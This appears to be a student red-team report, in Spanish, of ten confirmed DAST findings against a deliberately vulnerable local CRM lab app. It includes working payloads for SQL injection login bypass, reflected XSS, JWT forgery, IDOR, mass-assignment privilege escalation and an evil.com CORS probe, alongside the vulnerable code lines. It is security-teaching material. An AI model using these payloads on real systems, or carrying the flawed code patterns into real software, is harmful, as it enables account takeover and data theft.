# Hallazgos DAST confirmados · Secure CRM (Hito 1)

Responsable: Davis Roldán (Equipo rojo).  
Entorno: instancia local via WAF `http://localhost:8080` con Colima.  
Fecha de verificación: 2026-11-04T01:51:27Z  
WAF en modo `DetectionOnly` — los ataques llegan a la API sin ser bloqueados.

Estos diez hallazgos corresponden al tablero de retos de la [guía DAST del curso](../dast/index.html) y a la tabla PASTA etapa 5 en [`README.md`](README.md). Cada uno fue confirmado con evidencia de petición y respuesta real.

---

## H-01 · SQL Injection en login

**Ubicación:** `apps/api/src/auth.ts:30` · `POST /api/auth/login`  
**OWASP Top 10:2025:** A05 Injection · **CWE:** CWE-89 · **CVSS:** 9.1 Crítica
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

**Payload:**
```
POST /api/auth/login
{"username":"admin'--","password":"cualquiera"}
```

**Respuesta (200 OK — login sin contraseña válida):**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": { "id": 1, "username": "admin", "role": "admin" }
}
```

**Por qué funciona:** la consulta se construye por concatenación:
```typescript
// auth.ts:30
const sql = `SELECT * FROM users WHERE username = '${username}' AND password_hash = '${hashed}'`;
```
El payload `admin'--` cierra la cadena y comenta el resto: `WHERE username = 'admin'--'`.

---

## H-02 · XSS reflejado en búsqueda de tickets

**Ubicación:** `apps/api/src/routes/tickets.ts:40` · `GET /api/tickets?q=`  
**OWASP Top 10:2025:** A05 Injection · **CWE:** CWE-79 · **CVSS:** 7.6 Alta  
`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N`

**Payload:**
```
GET /api/tickets?q=<script>alert(1)</script>
Authorization: Bearer <token-viewer>
```

**Respuesta (200 OK):**
```json
{
  "query": "<script>alert(1)</script>",
  "tickets": [...]
}
```

**Por qué funciona:** el campo `q` se refleja sin sanitizar en la respuesta JSON y el frontend lo renderiza en el DOM. El WAF lo registra pero en `DetectionOnly` no lo bloquea.

---

## H-03 · IDOR en tickets

**Ubicación:** `apps/api/src/routes/tickets.ts:51` · `GET /api/tickets/:id`  
**OWASP Top 10:2025:** A01 Broken Access Control · **CWE:** CWE-639 · **CVSS:** 8.1 Alta  
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`

**Payload:**
```
GET /api/tickets/1
Authorization: Bearer <token-viewer>
```

**Respuesta (200 OK — viewer lee ticket de cualquier agente):**
```json
{
  "id": 1,
  "title": "No puedo iniciar sesión en el portal",
  "customerName": "Comercial El Quetzal",
  "customerEmail": "contacto@elquetzal.gt"
}
```

**Por qué funciona:** no hay verificación de propiedad ni de rol antes de devolver el objeto.

---

## H-04 · JWT sin verificación de firma

**Ubicación:** `apps/api/src/middleware/auth.ts:21`  
**OWASP Top 10:2025:** A07 Authentication Failures · **CWE:** CWE-347 · **CVSS:** 9.1 Crítica
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

**Payload — token forjado con `role:"admin"` y firma falsa:**
```
GET /api/users
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload_role_admin>.firma_falsa
```
Payload decodificado: `{"sub":4,"username":"viewer","role":"admin","iat":1}`

**Respuesta (200 OK — acceso total con token forjado):**
```json
[usuarios con 4 registros incluyendo passwordHash]
```
`usuarios accesibles con token forjado: 4`

**Por qué funciona:**
```typescript
// middleware/auth.ts:21
const payload = jwt.decode(token) as any;  // decode NO verifica firma
```
`jwt.decode` solo decodifica sin validar la firma criptográfica.

---

## H-05 · Exposición de hashes MD5

**Ubicación:** `apps/api/src/routes/users.ts:23` · `GET /api/users`  
**OWASP Top 10:2025:** A04 Cryptographic Failures · **CWE:** CWE-327 · **CVSS:** 6.5 Media  
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

**Payload:**
```
GET /api/users
Authorization: Bearer <token-viewer>
```

**Respuesta (200 OK — hashes MD5 en claro):**
```json
[
  { "username": "admin",  "passwordHash": "2637a5c30af69a7bad877fdb65fbd78b" },
  { "username": "jperez", "passwordHash": "2ac9cb7dc02b3c0083eb70898e549b63" }
]
```

**Por qué es grave:** MD5 sin salt. El hash `2ac9cb7dc02b3c0083eb70898e549b63` corresponde a `Password1` (verificable en tablas rainbow). Cualquier usuario autenticado puede listar todos los hashes.

---

## H-06 · Cabeceras de seguridad ausentes y cookie insegura

**Ubicación:** `apps/api/src/index.ts:17-30` y `apps/api/src/auth.ts:48`  
**OWASP Top 10:2025:** A02 Security Misconfiguration · **CWE:** CWE-1004, CWE-693 · **CVSS:** 4.7 Media  
`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N`

**Evidencia en código fuente (`auth.ts:48`):**
```typescript
res.cookie('session', token, { httpOnly: false, secure: false });
```

**Cabeceras ausentes en todas las respuestas:**
- `Content-Security-Policy` — no presente
- `X-Frame-Options` — no presente
- `X-Content-Type-Options` — no presente
- `Strict-Transport-Security` — no presente

**Impacto:** cookie robable desde JavaScript; sin CSP el XSS tiene alcance total; sin `X-Frame-Options` hay riesgo de clickjacking.

---

## H-07 · CORS permisivo con credenciales

**Ubicación:** `apps/api/src/index.ts:17` · Respuestas de la API  
**OWASP Top 10:2025:** A02 Security Misconfiguration · **CWE:** CWE-942 · **CVSS:** 6.1 Media  
`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`

**Payload:**
```
OPTIONS /api/tickets
Origin: https://evil.com
Access-Control-Request-Method: GET
```

**Respuesta:**
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
Access-Control-Allow-Headers: *
```

**Por qué funciona:** la configuración refleja cualquier `Origin` y lo combina con `credentials: true`, permitiendo que un sitio malicioso haga peticiones autenticadas en nombre del usuario.

---

## H-08 · Escalada de privilegios por mass assignment

**Ubicación:** `apps/api/src/routes/users.ts:47` · `POST /api/users`  
**OWASP Top 10:2025:** A08 Data Integrity Failures · **CWE:** CWE-915 · **CVSS:** 8.1 Alta  
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`

**Payload (con token de viewer):**
```
POST /api/users
Authorization: Bearer <token-viewer>
{"username":"hacker","email":"h@x.com","password":"test123","role":"admin"}
```

**Respuesta (201 Created — cuenta admin creada por viewer):**
```json
{
  "id": 5,
  "username": "hacker",
  "role": "admin",
  "createdAt": "2026-11-04 01:51:11"
}
```

**Por qué funciona:** el campo `role` del body se persiste directamente sin lista blanca ni verificación de que el solicitante sea administrador.

---

## H-09 · Login sin límite de intentos (fuerza bruta)

**Ubicación:** `apps/api/src/auth.ts:24` · `POST /api/auth/login`  
**OWASP Top 10:2025:** A07 Authentication Failures · **CWE:** CWE-307 · **CVSS:** 5.3 Media  
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

**Evidencia — 5 intentos fallidos consecutivos, todos HTTP 401 (nunca 429 ni bloqueo):**
```
intento 1: HTTP 401
intento 2: HTTP 401
intento 3: HTTP 401
intento 4: HTTP 401
intento 5: HTTP 401
```

**Por qué funciona:** no hay rate limiting, contador de intentos ni bloqueo temporal. Se pueden probar miles de contraseñas sin restricción.

---

## H-10 · Mensajes de error verbosos

**Ubicación:** `apps/api/src/auth.ts:36` · `POST /api/auth/login`  
**OWASP Top 10:2025:** A02 Security Misconfiguration · **CWE:** CWE-209 · **CVSS:** 5.3 Media  
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

**Payload (comilla sin cerrar para disparar error SQL):**
```
POST /api/auth/login
{"username":"admin'","password":"x"}
```

**Respuesta (500 — devuelve la consulta SQL completa):**
```json
{
  "error": "Error en la consulta",
  "sql": "SELECT * FROM users WHERE username = 'admin'' AND password_hash = '9dd4e461268c8034f5c8564e155c67a6'",
  "detail": "unrecognized token: \"9dd4e461268c8034f5c8564e155c67a6\""
}
```

**Impacto:** revela la estructura exacta de la consulta SQL, el nombre de la tabla, las columnas y el motor de base de datos. Facilita afinar el payload de H-01.

---

## Resumen

| # | Hallazgo | OWASP A: | CWE | CVSS | Severidad | Confirmado |
|---|---|---|---|---|---|---|
| H-01 | SQLi en login | A05 | CWE-89 | 9.1 | Crítica | ✓ |
| H-02 | XSS reflejado en búsqueda | A05 | CWE-79 | 7.6 | Alta | ✓ |
| H-03 | IDOR en tickets | A01 | CWE-639 | 8.1 | Alta | ✓ |
| H-04 | JWT sin firma | A07 | CWE-347 | 9.1 | Crítica | ✓ |
| H-05 | Hashes MD5 expuestos | A04 | CWE-327 | 6.5 | Media | ✓ |
| H-06 | Cabeceras ausentes + cookie insegura | A02 | CWE-1004 | 4.7 | Media | ✓ |
| H-07 | CORS permisivo | A02 | CWE-942 | 6.1 | Media | ✓ |
| H-08 | Mass assignment (escalada de rol) | A08 | CWE-915 | 8.1 | Alta | ✓ |
| H-09 | Login sin rate limiting | A07 | CWE-307 | 5.3 | Media | ✓ |
| H-10 | Errores verbosos con SQL | A02 | CWE-209 | 5.3 | Media | ✓ |

**Para Hito 2:** los tres PoC prioritarios son H-04 y H-01 (CVSS 9.1 cada uno), y H-03 (CVSS 8.1). Ver [superficie.md](superficie.md) para la trazabilidad completa.
